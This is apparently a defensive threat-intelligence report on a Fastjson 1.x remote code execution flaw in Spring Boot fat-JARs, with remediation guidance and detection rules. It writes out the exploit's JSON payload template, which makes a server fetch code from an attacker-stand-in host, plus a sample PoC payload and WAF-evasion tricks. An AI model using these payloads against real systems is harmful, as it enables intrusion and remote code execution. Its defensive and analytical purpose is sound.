# Technical Analysis Report: Fastjson 1.x RCE — CVE-2026-16723 (2026-07-26)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-07-26
Version: DRAFT

## Executive Summary

A critical remote code execution vulnerability (CVE-2026-16723, CVSS 9.0) affects Alibaba's Fastjson JSON library versions 1.2.68 through 1.2.83 when deployed as Spring Boot executable fat-JARs. An unauthenticated attacker can submit specially crafted JSON containing a malicious `@type` value that triggers remote class loading via Spring Boot's `LaunchedURLClassLoader`, achieving arbitrary code execution with the privileges of the Java process. No authentication, no AutoType enablement, and no third-party gadget classes are required. Exploitation has been confirmed in the wild by ThreatBook and Imperva, targeting US financial services, healthcare, and technology sectors. As of 2026-07-25, no patched Fastjson 1.x release exists; organizations must enable SafeMode or migrate to Fastjson 2.x immediately.

## Background: Fastjson and Spring Boot Deployments

Fastjson is an open-source Java library originally developed by Alibaba for high-performance serialization of Java objects to JSON and deserialization of JSON back to Java objects. It is one of the most widely deployed JSON libraries in the Java ecosystem, particularly in enterprise environments with Alibaba Cloud or Chinese technology stacks. Fastjson 1.x has a long history of deserialization vulnerabilities related to its `autoType` feature, but CVE-2026-16723 represents a paradigm shift: it requires neither AutoType enablement nor third-party gadget classes, breaking the traditional defense playbook of blacklisting dangerous classes or disabling AutoType.

The vulnerability is specific to Spring Boot executable fat-JAR deployments (launched via `java -jar`). Plain non-fat JARs, generic uber-JARs, and WAR deployments on Tomcat/Jetty are unaffected. The exploit chain was verified on Spring Boot 2.x, 3.x, and 4.x across JDK 8, 11, 17, and 21.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-07-21 | Alibaba publishes security advisory following responsible disclosure by Kirill Firsov (FearsOff Cybersecurity) |
| 2026-07-22 | ThreatBook reports detection of in-the-wild exploitation attempts |
| 2026-07-23 | CISA-ADP assessment marks exploitation status as "none" (subsequently contradicted by active exploitation reports) |
| 2026-07-25 | No patched Fastjson 1.x version available in GitHub tags or Maven Central; public PoC exploit code released |
| 2026-07-26 | Multiple PoC repositories published; active exploitation ongoing primarily targeting US organizations |

## Root Cause: Fastjson Type-Resolution Logic Bypass

The vulnerability exploits a flaw in Fastjson's internal type-resolution path within `ParserConfig.checkAutoType()`. When processing a `@type` value in JSON input, Fastjson converts the type name into a class resource path (replacing dots with slashes and appending `.class`) and calls `getResourceAsStream()` to probe for class metadata. If the loaded resource contains a `@JSONType` annotation, Fastjson treats it as a trusted type and skips its dangerous-base-class checks.

In Spring Boot fat-JAR deployments, the `LaunchedURLClassLoader` resolves resource lookups -- including those with `jar:http://` schemes. An attacker can construct a `@type` value like `jar:http:..ATTACKER_IP:PORT.path!.CLASS` that causes `getResourceAsStream()` to fetch a remote JAR file over HTTP. The attacker-controlled JAR contains a class with a `@JSONType` annotation and a malicious static initializer (`<clinit>`), which executes arbitrary code upon class loading.

On JDK 17+ where direct remote JAR caching behavior differs, the exploit chain uses `/proc/self/fd` reuse to load attacker-controlled classes after the initial remote resource fetch.

## Technical Analysis of the Malicious Payload

### 1. Exploit Delivery — Crafted JSON Request

The attacker sends an HTTP POST request with a JSON body containing the exploit payload to any endpoint that passes attacker-controlled JSON to `JSON.parse()`, `JSON.parseObject(String)`, or `JSON.parseObject(String, Class)`. Binding input to a fixed class is insufficient because attackers can nest payloads inside `Object` or `Map`-typed fields of the DTO.

The payload structure follows this pattern:

```json
{"@type":"jar:http:..ATTACKER_IP:PORT.path!.ClassName","x":1}
```

The dots in the `@type` value are converted to path separators by Fastjson, transforming the value into a `jar:http://ATTACKER_IP:PORT/path!/ClassName.class` resource URL.

### 2. Remote Class Loading — LaunchedURLClassLoader Abuse

When `checkAutoType()` processes the crafted `@type` value:
1. The type name is converted to a resource path: `typeName.replace('.', '/') + ".class"`
2. This results in a `jar:http://` URL that Spring Boot's `LaunchedURLClassLoader` resolves as a network resource
3. The ClassLoader fetches the remote JAR over HTTP
4. Fastjson finds a `@JSONType` annotation on the loaded class, treating it as trusted
5. The class's static initializer (`<clinit>`) executes, achieving arbitrary code execution

### 3. C2 Infrastructure

No specific C2 infrastructure has been attributed to a single threat actor. Imperva reports that attack traffic originates from:
- Browser impersonator tools (majority of observed traffic)
- Ruby-based and Go-based attack tools (~30% combined)
- Targeting primarily US-based organizations, with smaller volumes directed at Singapore and Canada

### 4. Platform-Specific Behavior

#### Linux (Primary Target)

Linux Spring Boot fat-JAR deployments are the primary target. On JDK 17+, the exploit chain leverages `/proc/self/fd` to reference cached remote JAR resources for class loading.

#### Windows

Windows deployments running as Spring Boot fat-JARs are also vulnerable. The `LaunchedURLClassLoader` remote resource resolution works cross-platform. The `/proc/self/fd` technique is Linux-specific, but JDK 8 on Windows can load remote JARs directly.

### 5. Anti-Forensics / Evasion Techniques

The exploit payload can use integer IP encoding (e.g., `2130706433` for `127.0.0.1`) to evade simple pattern-matching WAF rules. Attackers may also use URL encoding or Unicode escapes within the JSON to bypass basic string-matching filters. The `@type` value itself can be obfuscated through various JSON encoding techniques that Fastjson's parser normalizes during processing.

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)

### Package / Software Level

| Package / Component | Vulnerable Version | Description |
|---------------------|-------------------|-------------|
| com.alibaba:fastjson | 1.2.68 - 1.2.83 | All versions in this range are vulnerable when deployed as Spring Boot fat-JARs with SafeMode disabled (default) |
| com.alibaba:fastjson | 1.2.83_noneautotype | Restricted build without AutoType; mitigates this vulnerability |

### File System

No specific file system IOCs have been published. The exploit is a network-delivered payload that triggers in-memory class loading. Defenders should monitor for:
- Unexpected outbound HTTP connections from Java processes to external hosts fetching `.jar` or `.class` files
- Files in JVM temporary directories that correspond to remotely fetched JAR resources

### Network

| Type | Value | Context |
|------|-------|---------|
| HTTP Pattern | POST with `@type` + `jar:http` in JSON body | Exploit payload delivery |
| HTTP Pattern | POST with `@type` + `jar:https` in JSON body | Exploit payload delivery (HTTPS variant) |

No specific attacker IP addresses, domains, or URLs have been published in the available advisories. The exploit is parameterized -- attackers supply their own infrastructure in the `@type` value.

### Behavioral

- HTTP POST requests to any application endpoint containing JSON body with `"@type"` followed by `"jar:http"` or `"jar:https"` within 50 bytes -- this is the exploit payload pattern
- Outbound HTTP requests from Java/Spring Boot server processes to external hosts for `.jar` or `.class` resources -- this is the callback triggered by the exploit
- The `LaunchedURLClassLoader.getResourceAsStream()` resolving `jar:http://` URLs -- observable in application-level debugging/tracing logs

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1190 | Exploit Public-Facing Application | Attacker sends crafted JSON payload to Spring Boot application endpoint to trigger Fastjson deserialization RCE |
| T1059 | Command and Scripting Interpreter | Post-exploitation code execution via Java static initializer (`<clinit>`) in attacker-controlled class |
| T1105 | Ingress Tool Transfer | Exploit causes victim server to fetch attacker-hosted JAR file over HTTP during deserialization |

## Impact Assessment

**Breadth:** Fastjson 1.x remains one of the most widely deployed JSON libraries in Java enterprise environments, particularly in organizations with Chinese technology stacks or Alibaba Cloud integrations. Any Spring Boot fat-JAR deployment using Fastjson 1.2.68-1.2.83 with default configuration is vulnerable.

**Depth:** The vulnerability allows unauthenticated remote code execution with the privileges of the Java process. In typical deployments, this grants the attacker full control of the application server, access to databases and internal services, and a pivot point for lateral movement.

**Stealth:** The exploit payload is delivered in a standard JSON HTTP request, making it difficult to distinguish from legitimate API traffic without deep content inspection. The payload can be further obfuscated through JSON encoding techniques.

**Active exploitation:** Confirmed by ThreatBook (July 22) and Imperva, targeting financial services, healthcare, computing, and retail sectors, primarily in the United States.

## Detection & Remediation

### Immediate Detection

Check if your environment uses a vulnerable Fastjson version:

```bash
# Search for Fastjson JARs in deployed applications
find / -name "fastjson-*.jar" 2>/dev/null | grep -v "fastjson2"

# Check Maven/Gradle dependency trees
mvn dependency:tree | grep fastjson
gradle dependencies | grep fastjson

# Check running processes for Fastjson
lsof 2>/dev/null | grep fastjson
```

Review web application firewall (WAF) and reverse proxy logs for POST requests containing `@type` and `jar:http` in the request body.

### Remediation

1. **Immediate (Priority 0):** Enable SafeMode on all Fastjson 1.x deployments using one of:
   - JVM parameter: `-Dfastjson.parser.safeMode=true`
   - Programmatic: `ParserConfig.getGlobalInstance().setSafeMode(true);`
   - Properties file: add `fastjson.parser.safeMode=true` to classpath `fastjson.properties`

2. **Immediate (Priority 0, alternative):** Switch to the restricted build artifact:
   - Maven: `com.alibaba:fastjson:1.2.83_noneautotype`

3. **Short-term:** Deploy WAF rules to block HTTP requests with JSON bodies containing `@type` combined with `jar:http` or `jar:https` patterns.

4. **Long-term (Priority 1):** Migrate to Fastjson 2.x, which is architecturally different and not affected by this vulnerability class.

**Advisory note:** Enabling SafeMode disables all AutoType functionality, which may break applications that rely on polymorphic JSON deserialization. Test in staging before deploying to production. The efficacy of SafeMode depends on it being applied to all `ParserConfig` instances in the application -- custom configurations that create separate `ParserConfig` objects may not inherit the global SafeMode setting.

### Long-Term Hardening

- Implement input validation at the application layer to reject JSON payloads containing `@type` fields unless explicitly required
- Restrict outbound network access from application servers to prevent the remote class loading callback
- Deploy runtime application self-protection (RASP) solutions that can detect and block deserialization attacks
- Maintain an inventory of all Fastjson deployments and their versions for rapid response to future advisories

## Detection Rules

These detections target the CVE-2026-16723 exploit payload pattern: JSON requests containing `@type` values with `jar:http` schemes that trigger Fastjson's remote class loading. All rules are PoC/advisory-specific (default altitude, strict leniency), keyed on the distinctive `@type` + `jar:http` combination from published exploit code. Compiles does not equal fires -- verify in your pipeline.

### Sigma: Fastjson CVE-2026-16723 RCE Exploit in HTTP Request

Detects HTTP requests with `@type` and `jar:http` in the request body, characteristic of CVE-2026-16723 exploitation. Requires web server or WAF logging that captures request body content (e.g., ModSecurity, AWS ALB access logs with body logging).
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check -x attacktag 0 (attacktag excluded: MITRE data download blocked by proxy, not a rule defect); splunk 0; log_scale 0. No pipeline-mapped conversion (no webserver pipeline available). Field cs-body requires request body logging -- not present in default Apache/Nginx access logs; WAF or application-layer logging needed. Pattern is highly distinctive: @type + jar:http in same request body has near-zero benign overlap. -->
```yaml
title: Fastjson CVE-2026-16723 RCE Exploit Payload in HTTP Request
id: f8e3a47b-9c12-4d56-8a1f-3b7e2c9d0f14
status: experimental
description: >
    Detects HTTP requests containing Fastjson deserialization exploit payload
    with @type field pointing to a jar:http scheme, characteristic of
    CVE-2026-16723 exploitation targeting Spring Boot fat-JAR deployments.
references:
    - https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html
    - https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83
author: Actioner
date: 2026/07/26
tags:
    - attack.t1190
logsource:
    category: webserver
detection:
    selection:
        cs-body|contains|all:
            - '@type'
            - 'jar:http'
    condition: selection
falsepositives:
    - Legitimate JSON payloads with @type fields containing jar:http values are extremely unlikely
level: high
```

### Snort: Fastjson CVE-2026-16723 RCE @type jar:http Payload

Detects inbound HTTP POST requests with `@type` and `jar:http` in the request body, matching the CVE-2026-16723 exploit payload.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -c /etc/snort/snort.conf -T exit 0 (rule added to local.rules). Snort 2.9.20. content:"@type" fast_pattern anchors in http_client_body; content:"jar:http" distance:0 within:50 ensures proximity. Covers both jar:http: and jar:https: since jar:http is prefix. Hex |3a| used for colon to avoid ambiguity. Near-zero FP: no legitimate JSON uses @type with jar:http scheme. -->
```snort
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - Fastjson CVE-2026-16723 RCE @type jar:http Payload"; flow:established,to_server; content:"@type"; http_client_body; fast_pattern; content:"jar|3a|http"; http_client_body; distance:0; within:50; sid:2100001; rev:1; classtype:attempted-admin; reference:cve,2026-16723; reference:url,thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html;)
```

### Suricata: Fastjson CVE-2026-16723 RCE @type jar:http Payload

Detects inbound HTTP POST requests with `@type` and `jar:http` in the request body using Suricata dot-notation sticky buffers.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T -S exit 0 (Suricata 7.0.3). http.method POST gates on request direction; http.request_body content:"@type" fast_pattern + content:"jar:http" distance:0 within:50 for proximity. Covers jar:http and jar:https. Near-zero FP. -->
```suricata
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - Fastjson CVE-2026-16723 RCE @type jar:http Payload"; flow:established,to_server; http.method; content:"POST"; http.request_body; content:"@type"; fast_pattern; content:"jar:http"; distance:0; within:50; classtype:attempted-admin; reference:cve,2026-16723; reference:url,thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html; metadata:author Actioner, created_at 2026-07-26; sid:2200001; rev:1;)
```

### YARA: Fastjson CVE-2026-16723 RCE Exploit Payload

Detects the Fastjson CVE-2026-16723 exploit payload pattern in files (network captures, WAF log exports, request dumps). Useful for scanning PCAPs and log archives.
**Status:** compile ✅ compiles · confidence: high · sample: fired ✓
<!-- audit: yarac exit 0. yara fired on positive sample (published PoC payload: {"@type":"jar:http:..2130706433:19090.probe!.POC","x":1}), quiet on negative (legitimate @type JSON without jar:http). filesize < 10MB prevents scanning large irrelevant files. ascii + wide covers both encodings. -->
```yara
rule Exploit_CVE_2026_16723_Fastjson_RCE_Payload
{
    meta:
        description = "Detects Fastjson CVE-2026-16723 exploit payload with @type jar:http scheme for remote class loading"
        author = "Actioner"
        date = "2026-07-26"
        reference = "https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html"
        severity = "critical"
        tlp = "WHITE"

    strings:
        $type_key = "\"@type\"" ascii
        $jar_http = "jar:http" ascii nocase
        $type_key_w = "\"@type\"" wide
        $jar_http_w = "jar:http" wide nocase

    condition:
        filesize < 10MB and
        (($type_key and $jar_http) or ($type_key_w and $jar_http_w))
}
```

## Lessons Learned

This vulnerability demonstrates a fundamental shift in Fastjson exploitation: prior Fastjson RCEs required AutoType to be enabled and relied on gadget classes in the application classpath, making defense a matter of disabling AutoType and managing dependencies. CVE-2026-16723 bypasses both defenses entirely by exploiting Fastjson's own `@JSONType` annotation trust logic and Spring Boot's `LaunchedURLClassLoader` resource resolution. The lesson is clear -- Fastjson 1.x should be treated as end-of-life with no expectation of a security patch. Organizations should prioritize migration to Fastjson 2.x rather than relying on configuration-based mitigations for a library whose fundamental architecture enables exploitation.

The lack of any patched 1.x release five days after public disclosure and active exploitation underscores the operational risk of depending on libraries with unclear maintenance commitments.

## Sources

- [The Hacker News - Fastjson 1.x RCE Vulnerability Targeted](https://thehackernews.com/2026/07/fastjson-1x-rce-vulnerability-targeted.html) — primary news report with attack context, affected version range, mitigation guidance, and Imperva/ThreatBook exploitation data
- [Alibaba Security Advisory - Remote Code Execution in fastjson 1.2.68-1.2.83](https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83) — official advisory with affected versions, exploitation prerequisites, and remediation steps
- [Imperva Blog - CVE-2026-16723: Critical FastJson 1.x Zero-Day RCE (Security Boulevard)](https://securityboulevard.com/2026/07/imperva-customers-protected-against-cve-2026-16723-critical-fastjson-1-x-zero-day-rce/) — attack distribution statistics, industry targeting, and WAF protection context
- [0x7eTeam PoC - fastjson-1.2.83-rce (GitHub)](https://github.com/0x7eTeam/fastjson-1.2.83-rce) — public PoC with exploit payload structure, checkAutoType bypass mechanism, and LaunchedURLClassLoader abuse chain
- [dinosn/fastjson-jsontype-rce-lab (GitHub)](https://github.com/dinosn/fastjson-jsontype-rce-lab) — Docker lab with exploit reproduction, defensive scanner tools (fjdetect.py, fjscan_static.py), and detection patterns
- [NSFOCUS Advisory - Fastjson 1.2.x RCE Without Gadget](https://nsfocusglobal.com/fastjson-1-2-x-remote-code-execution-without-gadget-vulnerability-notice/) — CVSS 9.8 rating, WAF rule reference (27004897), and SafeMode configuration guidance

---
*Report generated by Actioner*
